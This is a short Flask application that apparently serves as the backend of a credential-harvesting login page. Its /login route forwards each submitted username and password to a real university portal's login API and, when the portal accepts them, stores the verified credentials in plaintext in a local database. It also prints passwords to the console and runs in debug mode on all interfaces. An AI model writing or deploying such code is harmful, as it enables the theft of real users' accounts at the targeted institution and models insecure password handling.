from flask import Flask, render_template, url_for, request, session, redirect, make_response
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import secrets, os, requests, json, traceback

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_urlsafe(16)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.abspath('./site.db')

sql = SQLAlchemy(app)
app.app_context().push()
class UsersTable(sql.Model):
    id = sql.Column(sql.Integer, primary_key=True)
    login = sql.Column(sql.String)
    password = sql.Column(sql.String)

with app.app_context():
    sql.create_all()

@app.route("/")
@app.route("/index")
def index():
    return render_template("index.html")

@app.route("/login", methods=["POST", "GET"])
def register():
    if (request.method == "POST"):
        try:
            print(request.form)
            x = requests.post('https://platonus.dulaty.kz/rest/api/login', json = {"login":request.form['login'],"iin":"null","icNumber":"null","password":request.form['password'],"authForDeductedStudentsAndGraduates":"false"})
            print(x.text)
            if x.status_code != 200:
                platonusJsonObj = json.loads(x.text)
                return json.dumps({"message" : platonusJsonObj['message'], "login_status":"invalid"}) , 403, {'Content-Type': 'application/json'} 
            user = UsersTable(login=request.form['login'], password=request.form['password'])
            sql.session.add(user)
            sql.session.commit()
            return 'redirecting...' , 200, {'Content-Type': 'plain/text'} 
        except Exception as e:
            sql.session.rollback()
            print(f"An DB error occured : {e}")
            traceback_str = traceback.format_exc()
            print("Traceback:\n", traceback_str) 
    return render_template("index.html")

@app.errorhandler(404)
def pageNotFound(error):
    return redirect(url_for('index'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)